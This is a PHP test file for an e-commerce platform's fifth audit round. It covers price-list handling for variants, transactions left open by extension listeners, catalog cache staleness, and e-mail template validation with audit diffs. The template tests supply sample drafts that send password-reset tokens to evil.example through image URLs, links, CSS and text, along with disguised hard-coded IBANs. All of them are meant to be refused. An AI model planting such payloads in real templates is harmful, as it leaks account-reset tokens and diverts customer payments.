<?php

// Audit round 5 — money and robustness: a product-level price list prices the product base, so a variant keeps its own
// absolute price and its delta; an extension listener that leaves a transaction open no longer swallows the rest of the
// worker run; the catalog cache marker compares file times of one clock and is written again after the commit; an
// e-mail template cannot send one-time tokens to a foreign server or hard-code a bank account, and its audit row is a diff.
echo "\n--- Audit round 5: money and robustness ---\n";
Bootstrap::initStoreContext('/', '', 'default');
$r5mDb = Db::get();

// --- Product-level price list vs variant prices ------------------------------------------------------------------
$r5mDb->prepare("INSERT INTO categories (store_id, slug, name, parent_id, path, depth) VALUES ('default', 'r5m-cat', 'R5M Cat', NULL, 'r5m-cat', 0)")->execute();
$r5mDb->prepare("INSERT INTO products (store_id, category_id, sku, slug, name, price, stock, status) VALUES ('default', ?, 'R5M-P', 'r5m-p', 'R5M Product', 6000, 10, 'active')")
    ->execute([(int)$r5mDb->lastInsertId()]);
$r5mProduct = (int)$r5mDb->lastInsertId();
$r5mVariant = static function (string $sku, ?int $absolute, int $delta) use ($r5mDb, $r5mProduct): int {
    $r5mDb->prepare("INSERT INTO variants (product_id, sku, name, stock, price_absolute, price_delta) VALUES (?, ?, ?, 5, ?, ?)")
        ->execute([$r5mProduct, $sku, $sku, $absolute, $delta]);
    return (int)$r5mDb->lastInsertId();
};
$r5mAbsolute = $r5mVariant('R5M-ABS', 99900, 0);
$r5mDelta = $r5mVariant('R5M-DELTA', null, 500);
$r5mInherit = $r5mVariant('R5M-BASE', null, 0);
$r5mOwn = $r5mVariant('R5M-OWN', null, 0);
$r5mDb->prepare("INSERT INTO price_lists (store_id, code, name, currency, customer_group_id, priority, active) VALUES ('default', 'r5m-list', 'R5M', 'eur', NULL, 0, 1)")->execute();
$r5mList = (int)$r5mDb->lastInsertId();
$r5mDb->prepare('INSERT INTO price_list_prices (price_list_id, product_id, variant_id, min_qty, price) VALUES (?, ?, NULL, 1, 6747)')->execute([$r5mList, $r5mProduct]);
$r5mDb->prepare('INSERT INTO price_list_prices (price_list_id, product_id, variant_id, min_qty, price) VALUES (?, ?, ?, 1, 5000)')->execute([$r5mList, $r5mProduct, $r5mOwn]);
$r5mPrice = static fn(int $base, ?int $variantId): int => (int)Pricing::applyPriceList(['id' => $r5mProduct, 'price' => $base, 'currency' => 'eur'], $variantId)['price'];
assert_equals(99900, $r5mPrice(99900, $r5mAbsolute), 'R5 money: a 999 € variant is not sold for the product-level 67.47 €');
assert_equals(7247, $r5mPrice(6500, $r5mDelta), 'R5 money: a +5 € variant costs the listed base + 5 €');
assert_equals(6747, $r5mPrice(6000, $r5mInherit), 'R5 money: a variant without own price takes the listed base');
assert_equals(5000, $r5mPrice(6000, $r5mOwn), 'R5 money: a variant row of the price list wins');
assert_equals(6747, $r5mPrice(6000, null), 'R5 money: the product itself takes the listed price');

// --- An extension listener that leaves a transaction open ------------------------------------------------------
$r5mListeners = new ReflectionProperty(Extensions::class, 'listeners');
$r5mBooted = new ReflectionProperty(Extensions::class, 'booted');
$r5mSavedListeners = $r5mListeners->getValue();
$r5mSavedBooted = $r5mBooted->getValue();
$r5mDb->beginTransaction();
$r5mEventId = Outbox::record(DomainEvents::ORDER_CREATED, 'order', 95001, ['order_id' => 95001, 'order_number' => 'R5M-1']);
$r5mDb->commit();
$r5mEvent = $r5mDb->query("SELECT * FROM event_outbox WHERE id = '{$r5mEventId}'")->fetch(PDO::FETCH_ASSOC);
try {
    $r5mBooted->setValue(null, true);
    $r5mListeners->setValue(null, [
        'ext:r5m:leaky' => ['events' => DomainEvents::ORDER_CREATED, 'listener' => static function () use ($r5mDb): void { $r5mDb->beginTransaction(); }],
        'ext:r5m:after' => ['events' => DomainEvents::ORDER_CREATED, 'listener' => static function (): void {}],
    ]);
    $r5mResult = Extensions::deliver($r5mEvent, Outbox::envelope($r5mEvent));
    $r5mOpen = $r5mDb->inTransaction();
    if ($r5mOpen) $r5mDb->rollBack();
    assert_true(!$r5mOpen, 'R5 money: no transaction is left open after the extension listeners ran');
    $r5mStmt = $r5mDb->prepare('SELECT endpoint_code, status FROM webhook_deliveries WHERE event_id = ? ORDER BY endpoint_code');
    $r5mStmt->execute([$r5mEventId]);
    assert_equals([['endpoint_code' => 'ext:r5m:after', 'status' => 'delivered'], ['endpoint_code' => 'ext:r5m:leaky', 'status' => 'failed']], $r5mStmt->fetchAll(PDO::FETCH_ASSOC),
        'R5 money: the later writes of the run are kept and the leaky listener is a failed delivery');
    assert_true(count($r5mResult['failures']) === 1 && str_contains($r5mResult['failures'][0], 'ext:r5m:leaky') && str_contains($r5mResult['failures'][0], 'transaction'),
        'R5 money: the failure names the listener and the open transaction (' . json_encode($r5mResult['failures']) . ')');
} finally {
    if ($r5mDb->inTransaction()) $r5mDb->rollBack();
    $r5mListeners->setValue(null, $r5mSavedListeners);
    $r5mBooted->setValue(null, $r5mSavedBooted);
}

// --- Catalog cache marker ----------------------------------------------------------------------------------------
$r5mCache = sys_get_temp_dir() . '/bbe_r5m_cache_' . bin2hex(random_bytes(4));
try {
    Cache::setDir($r5mCache);
    $r5mMarker = $r5mCache . '/catalogs/' . rawurlencode(StoreContext::current()->catalogId()) . '.changed';
    $r5mEntry = Cache::path('r5m/entry.json');
    // Same clock: the marker's file time decides, whatever time the PHP clock wrote into it.
    Cache::catalogChanged();
    Cache::writeJson('r5m/entry.json', ['r5m' => 1]);
    touch($r5mEntry, time() - 30);
    file_put_contents($r5mMarker, (string)(time() - 600));
    touch($r5mMarker, time() - 10);
    assert_equals(null, Cache::readCatalogJson('r5m/entry.json', 3600), 'R5 money: an entry older than the marker file is stale even when the marker text says otherwise');
    // Changed inside a transaction: an entry rebuilt from the old rows before the commit is stale after it.
    $r5mDb->beginTransaction();
    Cache::catalogChanged();
    file_put_contents($r5mMarker, (string)(time() - 20));
    touch($r5mMarker, time() - 20);
    Cache::writeJson('r5m/entry.json', ['r5m' => 'old rows']);
    touch($r5mEntry, time() - 5);
    $r5mDb->commit();
    assert_equals(null, Cache::readCatalogJson('r5m/entry.json', 3600), 'R5 money: the catalog marker is written again after the commit');
    Cache::writeJson('r5m/entry.json', ['r5m' => 'fresh']);
    touch($r5mEntry, time() + 5);
    assert_equals(['r5m' => 'fresh'], Cache::readCatalogJson('r5m/entry.json', 3600), 'R5 money: an entry built after the marker is served');
} finally {
    if ($r5mDb->inTransaction()) $r5mDb->rollBack();
    Cache::setDir(TEST_CLI_DIR . '/../cache');
}

// --- E-mail template overrides (emails.manage) -------------------------------------------------------------------
$r5mValid = static fn(string $template, array $draft): array => EmailTemplates::validate($template, $draft['subject'] ?? 'R5M subject',
    $draft['html'] ?? '<p>R5M</p>', $draft['text'] ?? '');
$r5mLeak = static fn(array $draft): bool => str_contains(implode(' ', $r5mValid('account_password_reset', $draft)), 'reset_url');
assert_true($r5mLeak(['html' => '<p>Hi</p><img src="https://evil.example/p.gif?t={{reset_url}}">']), 'R5 money: a reset link inside an image address is refused');
assert_true($r5mLeak(['html' => '<a href="https://evil.example/?u={{reset_url}}">Reset</a>']), 'R5 money: a reset link inside a foreign link is refused');
assert_true($r5mLeak(['html' => '<p style="background:url({{reset_url}})">x</p>']), 'R5 money: a reset link in a style is refused');
assert_true($r5mLeak(['html' => '<p>https://evil.example/?t={{reset_url}}</p>']), 'R5 money: a reset link glued to a foreign URL in the HTML text is refused');
assert_true($r5mLeak(['text' => 'Open https://evil.example/?t={{reset_url}}']), 'R5 money: a reset link glued to a foreign URL in the text part is refused');
assert_true($r5mLeak(['subject' => 'Reset {{reset_url}}']), 'R5 money: a reset link in the subject is refused');
assert_equals([], $r5mValid('account_password_reset', ['html' => "<p><a href=\"{{reset_url}}\">Reset</a></p>\n<p>Or copy: {{reset_url}}</p>", 'text' => "Reset: {{reset_url}}\n"]),
    'R5 money: a whole reset link and the plain copy line are allowed');
$r5mIban = static fn(string $html): bool => str_contains(implode(' ', $r5mValid('order_confirmation', ['html' => $html])), '{{bank_iban}}');
assert_true($r5mIban('<p>IBAN: SK89 7500 0000 0000 1234 5671</p>'), 'R5 money: a hard-coded IBAN is refused');
assert_true($r5mIban('<p>IBAN: <b>SK89</b>&#8203;7500<span></span>000000001234 5671</p>'), 'R5 money: an IBAN split by tags, entities or zero-width characters is refused');
assert_true(!$r5mIban('<p>IBAN: <strong>{{bank_iban}}</strong>, {{order_number}}</p>'), 'R5 money: the configured {{bank_iban}} is allowed');

$r5mPrevLocale = I18n::locale();
try {
    I18n::setLocale('en');
    Db::get()->prepare("DELETE FROM email_template_overrides WHERE template = 'order_shipped'")->execute();
    $r5mBase = ['subject' => 'R5M {{order_number}}', 'text' => ''];
    $r5mFirst = EmailTemplates::save('order_shipped', 'sk', $r5mBase + ['html' => "<p>R5M head</p>\n<p>R5M old line</p>\n<p>R5M tail</p>"]);
    $r5mSecond = EmailTemplates::save('order_shipped', 'sk', $r5mBase + ['html' => "<p>R5M head</p>\n<p>R5M new line</p>\n<p>R5M tail</p>"]);
    $r5mAudit = $r5mDb->query("SELECT new_value FROM audit_log WHERE entity = 'email_template' ORDER BY id DESC LIMIT 1")->fetchColumn();
    $r5mDiff = (string)(json_decode((string)$r5mAudit, true)['html_diff'] ?? '');
    assert_true($r5mFirst['ok'] && $r5mSecond['ok'] && $r5mDiff === "@@ line 2\n-<p>R5M old line</p>\n+<p>R5M new line</p>",
        'R5 money: the audit row of a template change holds the line diff (' . json_encode($r5mDiff) . ')');
    EmailTemplates::reset('order_shipped', 'sk');
    $r5mResetAudit = json_decode((string)$r5mDb->query("SELECT old_value FROM audit_log WHERE entity = 'email_template' ORDER BY id DESC LIMIT 1")->fetchColumn(), true);
    assert_true(str_contains((string)($r5mResetAudit['html_diff'] ?? ''), '-<p>R5M new line</p>'), 'R5 money: a reset records what the override contained');
} finally {
    Db::get()->prepare("DELETE FROM email_template_overrides WHERE template = 'order_shipped'")->execute();
    I18n::setLocale($r5mPrevLocale);
}
